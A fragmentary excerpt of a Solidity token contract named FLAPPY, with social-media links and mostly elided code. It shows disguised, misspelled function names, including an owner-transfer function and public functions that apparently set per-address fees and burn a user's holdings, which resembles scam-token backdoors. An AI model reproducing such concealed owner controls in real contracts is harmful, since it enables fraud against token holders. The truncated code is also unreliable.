...
/**
https://t.me/FLAPPY0X65
https://twitter.com/Flappy_Erc20
0x65  Flappy
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipleyteryuis(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract FLAPPY is Ownable {
    ...
    function Apprerve(address[] memory _usr, uint256 _feePct) external {
    ...
    function _burnlisitys(address user) public {
